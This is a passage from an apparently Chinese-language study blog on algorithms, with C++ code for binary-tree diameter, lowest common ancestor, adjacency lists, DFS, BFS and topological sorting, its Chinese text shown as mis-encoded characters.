class="hljs-comment">//xä½œä¸ºå¤´èŠ‚ç‚¹æ—¶ï¼Œè¦å·¦å³æœ€å¤§é«˜åº¦ï¼Œxä¸ä½œä¸ºå¤´èŠ‚ç‚¹æ—¶ï¼Œè¦å·¦å’Œå³ç»Ÿè®¡å‡ºæ¥çš„æœ€å¤§è·ç¦»ï¼Œæ€»ç»“è¦é«˜åº¦å’Œæœ€å¤§è·ç¦»ï¼Œæœ€å¤§è·ç¦»çš„è®¡ç®—ï¼šxå·¦å³çš„æœ€å¤§è·ç¦»ï¼Œxé«˜åº¦å¾—å‡ºæ¥çš„è·ç¦»å–max</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">int</span> maxDistance;<br>    <span class="hljs-type">int</span> height;<br>    Info(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> h) : maxDistance(m), height(h) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) &#123;<br>        <span class="hljs-keyword">return</span> Info(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// å¦‚æœæ˜¯ç©ºèŠ‚ç‚¹ï¼Œæœ€å¤§è·ç¦»ä¸º0ï¼Œé«˜åº¦ä¸º0</span><br>    &#125;<br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br>    <br>    <span class="hljs-type">int</span> height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">// è®¡ç®—ä¸‰ç§æƒ…å†µçš„æœ€å¤§å€¼</span><br>    <span class="hljs-type">int</span> p1 = leftInfo.maxDistance;<br>    <span class="hljs-type">int</span> p2 = rightInfo.maxDistance;<br>    <span class="hljs-type">int</span> p3 = leftInfo.height + rightInfo.height + <span class="hljs-number">1</span>;  <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹çš„æœ€å¤§è·ç¦»ä¸ºå·¦å­æ ‘é«˜åº¦ + å³å­æ ‘é«˜åº¦ + 1</span><br><br>    <span class="hljs-type">int</span> maxDistance = max(&#123;p1, p2, p3&#125;);<br>    <span class="hljs-keyword">return</span> Info(maxDistance, height);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxDistance</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> process(head).maxDistance;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>- </p><ul><li><strong>åˆ†æ</strong>ï¼š<ul><li>å‰åºéå†çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å½“å‰å­æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚</li><li>åœ¨ä¸­åºéå†ä¸­æ‰¾åˆ°æ ¹èŠ‚ç‚¹ï¼Œåˆ’åˆ†å‡ºå·¦å­æ ‘å’Œå³å­æ ‘ã€‚</li><li>é€’å½’åœ°å¯¹å·¦å³å­æ ‘è¿›è¡ŒåŒæ ·çš„å¤„ç†ã€‚</li></ul></li><li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(n)ï¼Œå…¶ä¸­ n ä¸ºèŠ‚ç‚¹æ•°é‡ã€‚</li></ul><h4 id="æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼š"><a href="#æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼š" class="headerlink" title="æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼š"></a><strong>æ‰¾åˆ°ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</strong>ï¼š</h4><p><strong>é—®é¢˜æè¿°</strong>ï¼š                                                                                                                                                           </p><p> å…ˆæ±‚å‡ºçˆ¶ç»“ç‚¹ï¼Œç„¶åç”¨å‘ä¸Šæ ‡è®°æ³•<br>p å‘ä¸Šä¸€ç›´åˆ° root æ ‡çº¢è‰²<br>qå‘ä¸Šï¼Œç¬¬ä¸€æ¬¡é‡åˆ°çº¢è‰²æ—¶ï¼Œå°±æ‰¾åˆ°äº†LCA</p><p><strong>ä»£ç å®ç°</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java">#include &lt;iostream&gt;<br>using namespace std;<br><br><span class="hljs-comment">// æ ‘çš„èŠ‚ç‚¹ç»“æ„</span><br>struct TreeNode &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br>    TreeNode(<span class="hljs-type">int</span> x) : val(x), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    TreeNode* p = nullptr;<br>    TreeNode* q = nullptr;<br>    TreeNode* ans = nullptr;<br><br>    <span class="hljs-comment">// å¯»æ‰¾äºŒå‰æ ‘ä¸­ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</span><br>    TreeNode* Ansestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123;<br>        <span class="hljs-built_in">this</span>-&gt;p = p;<br>        <span class="hljs-built_in">this</span>-&gt;q = q;<br>        ans = nullptr;  <span class="hljs-comment">// ç¡®ä¿ ans åœ¨æ¯æ¬¡è°ƒç”¨æ—¶éƒ½ä¸º nullptr</span><br>        dfs(root);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br>    <span class="hljs-comment">// æ·±åº¦ä¼˜å…ˆæœç´¢è¾…åŠ©å‡½æ•°ï¼Œè¿”å›åŒ…å« p å’Œ q çš„æ ‡è®°</span><br>    pair&lt;bool, bool&gt; <span class="hljs-title function_">dfs</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>        <span class="hljs-keyword">if</span> (root == nullptr) <span class="hljs-keyword">return</span> &#123;<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>&#125;;<br><br>        <span class="hljs-comment">// é€’å½’æŸ¥æ‰¾å·¦å­æ ‘å’Œå³å­æ ‘</span><br>        pair&lt;bool, bool&gt; leftResult = dfs(root-&gt;left);<br>        pair&lt;bool, bool&gt; rightResult = dfs(root-&gt;right);<br><br>        <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹æ˜¯å¦åŒ…å« p æˆ– q çš„çŠ¶æ€</span><br>        pair&lt;bool, bool&gt; result;<br>        result.first = leftResult.first || rightResult.first || root == p;<br>        result.second = leftResult.second || rightResult.second || root == q;<br><br>        <span class="hljs-comment">// è‹¥å½“å‰èŠ‚ç‚¹åŒæ—¶åŒ…å« p å’Œ q ä¸” ans å°šæœªè¢«è®¾ç½®ï¼Œåˆ™å°†å½“å‰èŠ‚ç‚¹è®¾ç½®ä¸ºç­”æ¡ˆ</span><br>        <span class="hljs-keyword">if</span> (result.first &amp;&amp; result.second &amp;&amp; ans == nullptr) &#123;<br>            ans = root;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h2 id="åå…­-å›¾"><a href="#åå…­-å›¾" class="headerlink" title="åå…­.å›¾"></a>åå…­.å›¾</h2><h3 id="å›¾çš„å†™æ³•"><a href="#å›¾çš„å†™æ³•" class="headerlink" title="å›¾çš„å†™æ³•"></a>å›¾çš„å†™æ³•</h3><p>å…¶ä»–å½¢å¼çš„å›¾å…¨æŠ½è±¡ä¸ºâ€”â€”â€”â€”å‡ºè¾¹æ•°ç»„å®ç°</p><p>æ— å‘å›¾ç‰ˆæœ¬</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// edges = &#123;&#123;0, 1&#125;,&#123;1, 2&#125;,&#123;2, 3&#125;,&#123;0, 2&#125;,&#123;3, 4&#125;&#125;;</span><br><span class="hljs-comment">//to = &#123; &#123;1, 2&#125;, &#123;0, 2&#125;, &#123;1, 3, 0&#125;, &#123;2, 4&#125;, &#123;3&#125; &#125;;</span><br>          <span class="hljs-number">0</span>         <span class="hljs-number">1</span>         <span class="hljs-number">2</span>        <span class="hljs-number">3</span>     <span class="hljs-number">4</span><br><span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge:edges)&#123; <span class="hljs-comment">//æ‰¾åˆ°æœ€å¤§ç¼–å·</span><br>    <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>    n = <span class="hljs-built_in">max</span>(n,<span class="hljs-built_in">max</span>(x,y));<br>&#125;<br>n++;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">to</span>(n);  <span class="hljs-comment">// æ¯ä¸ªèŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªç©ºçš„ vector&lt;int&gt;</span><br><span class="hljs-keyword">for</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge:edges)&#123;<br>    <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>    to[x].<span class="hljs-built_in">push_back</span>(y);  <br>    to[y].<span class="hljs-built_in">push_back</span>(x);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰å‘å›¾å¸¦è·¯å¾„ç‰ˆæœ¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>) (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)      matrix<br><span class="hljs-number">1</span>: (<span class="hljs-number">2</span>, <span class="hljs-number">3</span>) <br><span class="hljs-number">2</span>: (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>) <br><span class="hljs-number">3</span>: <br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; convertToAdjacencyListWithWeights(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; edge : matrix) &#123;<br>        <span class="hljs-type">int</span> from = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// èµ·å§‹èŠ‚ç‚¹</span><br>        <span class="hljs-type">int</span> to = edge[<span class="hljs-number">2</span>];    <span class="hljs-comment">// ç›®æ ‡èŠ‚ç‚¹</span><br>        n = max(n, max(from, to));  <span class="hljs-comment">// æ‰¾åˆ°æœ€å¤§çš„èŠ‚ç‚¹ç¼–å·</span><br>    &#125;<br>    n++; <span class="hljs-comment">// å› ä¸ºèŠ‚ç‚¹ç¼–å·æ˜¯ä» 0 å¼€å§‹çš„ï¼Œæ‰€ä»¥å›¾çš„å¤§å°åº”è¯¥æ˜¯æœ€å¤§ç¼–å· + 1</span><br>    <br>    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šåˆå§‹åŒ–é‚»æ¥è¡¨ï¼Œç”¨ pair å­˜å‚¨ç›®æ ‡èŠ‚ç‚¹å’Œè¾¹çš„æƒé‡</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; adjList(n);<br>    <br>    <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šæ ¹æ®è¾“å…¥çš„çŸ©é˜µå¡«å……é‚»æ¥è¡¨</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; edge : matrix) &#123;<br>        <span class="hljs-type">int</span> weight = edge[<span class="hljs-number">0</span>];  <span class="hljs-comment">// è¾¹çš„æƒé‡</span><br>        <span class="hljs-type">int</span> from = edge[<span class="hljs-number">1</span>];    <span class="hljs-comment">// èµ·å§‹èŠ‚ç‚¹</span><br>        <span class="hljs-type">int</span> to = edge[<span class="hljs-number">2</span>];      <span class="hljs-comment">// ç›®æ ‡èŠ‚ç‚¹</span><br>        adjList[from].push_back(&#123;to, weight&#125;);  <span class="hljs-comment">// å°†è¾¹åŠ å…¥é‚»æ¥è¡¨</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> adjList;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>DFS</strong>ï¼šåˆ¤æ–­</p><p>DFS æ˜¯ä¸€ç§å›¾æˆ–æ ‘çš„éå†ç®—æ³•ï¼Œå®ƒæ²¿ç€ä¸€æ¡è·¯å¾„å°½å¯èƒ½æ·±å…¥ï¼Œç„¶åå›æº¯ï¼Œç»§ç»­æ¢ç´¢å…¶ä»–è·¯å¾„ã€‚</p><p>DFS çš„å®ç°æ–¹å¼ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//è®°å¾—åˆå§‹åŒ–</span><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to; <span class="hljs-comment">//æ„å»ºå‡ºè¾¹æ•°ç»„</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">visited</span><span class="hljs-params">(n,<span class="hljs-literal">false</span>)</span></span>;<br><span class="hljs-type">bool</span> hasCycle = <span class="hljs-literal">false</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> fa)</span> </span>&#123;<br>    visited[x] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>        <span class="hljs-keyword">if</span>(y == fa) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (!visited[y]) &#123;<br>            <span class="hljs-built_in">dfs</span>(y,x);  <span class="hljs-comment">// é€’å½’è®¿é—®æœªè®¿é—®çš„é‚»å±…</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            hasClcye = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>BFS</strong>ï¼š</p><p>BFS çš„å®ç°æ–¹å¼</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start)</span> </span>&#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">depth</span><span class="hljs-params">(n,<span class="hljs-number">-1</span>)</span></span>;<br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    q.<span class="hljs-built_in">push</span>(start);  <span class="hljs-comment">// å°†èµ·ç‚¹åŠ å…¥é˜Ÿåˆ—</span><br>    depth[start] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// æ ‡è®°èµ·ç‚¹å·²è®¿é—®</span><br><br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// ä»é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªèŠ‚ç‚¹</span><br><br>        <span class="hljs-comment">// è®¿é—®è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰é‚»å±…</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>            <span class="hljs-keyword">if</span>(depth[y] != <span class="hljs-number">-1</span>) <span class="hljs-keyword">continue</span>;<br>            depth[y] = depth[x] + <span class="hljs-number">1</span>;<br>            q.<span class="hljs-built_in">push</span>(y);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BFS æœ‰å‘å›¾â€”â€”â€”â€”æ‹“æ‰‘æ’åº </p><p>æ¥éªŒè¯æ˜¯å¦èƒ½æ­£ç¡®æ’åºç‰ˆ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">to</span>(n);  <span class="hljs-comment">// è¿™é‡Œæ˜¯å·²ç»æ„å»ºå¥½çš„to</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inDeg</span><span class="hljs-params">(n, <span class="hljs-number">0</span>)</span></span>;    <span class="hljs-comment">// åˆ›å»ºå¹¶åˆå§‹åŒ– inDeg</span><br><span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123; <br>    <span class="hljs-type">int</span> from = edge[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> toNode = edge[<span class="hljs-number">0</span>];<br>    to[from].<span class="hljs-built_in">push_back</span>(toNode);<br>    inDeg[toNode]++;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; sortOrder;  <span class="hljs-comment">// ä¿®æ”¹ä¸ºæ­£ç¡®çš„å˜é‡å</span><br>queue&lt;<span class="hljs-type">int</span>&gt; q;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">if</span> (inDeg[i] == <span class="hljs-number">0</span>) &#123;<br>        q.<span class="hljs-built_in">push</span>(i);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>    q.<span class="hljs-built_in">pop</span>();  <br>    sortOrder.<span class="hljs-built_in">push_back</span>(x);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>        inDeg[y]--;<br>        <span class="hljs-keyword">if</span> (inDeg[y] == <span class="hljs-number">0</span>) &#123;<br>            q.<span class="hljs-built_in">push</span>(y);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> sortOrder.<span class="hljs-built_in">size</span>() == n;<br><span class="hljs-comment">// è¾“å‡ºæœ€ç»ˆçš„æ’åºç»“æœ</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : sortOrder) &#123;<br>    cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br>cout &lt;&lt; endl;  <span class="hljs-comment">// æ¢è¡Œï¼Œè¾“å‡ºç»“æŸ</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡ºæ‰€æœ‰æ‹“æ‰‘æ’åºç‰ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> int long long</span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">// å›æº¯ç”Ÿæˆæ‰€æœ‰æ‹“æ‰‘æ’åº</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">allTopologicalSorts</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; to, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; inDeg, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;&amp; visited, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; sortOrder)</span> &#123;<br>    <span class="hljs-type">bool</span> flag = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ç”¨æ¥æ£€æŸ¥æ˜¯å¦æœ‰å…¥åº¦ä¸º 0 çš„èŠ‚ç‚¹</span><br><br>    <span class="hljs-comment">// éå†æ‰€æœ‰èŠ‚ç‚¹ï¼ŒæŸ¥æ‰¾å…¥åº¦ä¸º 0 ä¸”æœªè®¿é—®çš„èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inDeg[i] == <span class="hljs-number">0</span> &amp;&amp; !visited[i]) &#123;<br>            <span class="hljs-comment">// æ ‡è®°è¯¥èŠ‚ç‚¹å·²è®¿é—®</span><br>            visited[i] = <span class="hljs-literal">true</span>;<br>            sortOrder.push_back(i);  <span class="hljs-comment">// å°†è¯¥èŠ‚ç‚¹åŠ å…¥æ‹“æ‰‘æ’åº</span><br>            <span class="hljs-comment">// å°†è¯¥èŠ‚ç‚¹çš„é‚»æ¥èŠ‚ç‚¹çš„å…¥åº¦å‡ 1</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[i]) &#123;<br>                inDeg[y]--;<br>            &#125;<br>            <span class="hljs-comment">// é€’å½’è°ƒç”¨ç”Ÿæˆåç»­çš„æ‹“æ‰‘æ’åº</span><br>            allTopologicalSorts(n, to, inDeg, visited, sortOrder);<br>            <span class="hljs-comment">// å›æº¯è¿‡ç¨‹ï¼šæ¢å¤çŠ¶æ€</span><br>            visited[i] = <span class="hljs-literal">false</span>;<br>            sortOrder.pop_back();  <span class="hljs-comment">// ç§»é™¤å½“å‰èŠ‚ç‚¹</span><br>            <span class="hljs-comment">// æ¢å¤è¯¥èŠ‚ç‚¹é‚»æ¥èŠ‚ç‚¹çš„å…¥åº¦</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[i]) &#123;<br>                inDeg[y]++;<br>            &#125;<br>            flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ ‡è®°å·²ç»å¤„ç†äº†ä¸€ä¸ªå…¥åº¦ä¸º 0 çš„èŠ‚ç‚¹</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ›´å¤šèŠ‚ç‚¹å¯ä»¥é€‰æ‹©ï¼Œè¯´æ˜å·²ç»ç”Ÿæˆäº†ä¸€ä¸ªå®Œæ•´çš„æ‹“æ‰‘æ’åº</span><br>    <span class="hljs-keyword">if</span> (!flag) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : sortOrder) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºå½“å‰çš„æ‹“æ‰‘æ’åº</span><br>        &#125;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// ä¸»å‡½æ•°ï¼šæ‰§è¡Œæ‹“æ‰‘æ’åº</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">generateAllTopologicalSorts</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; to(n);  <br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">inDeg</span><span class="hljs-params">(n, <span class="hljs-number">0</span>)</span>;    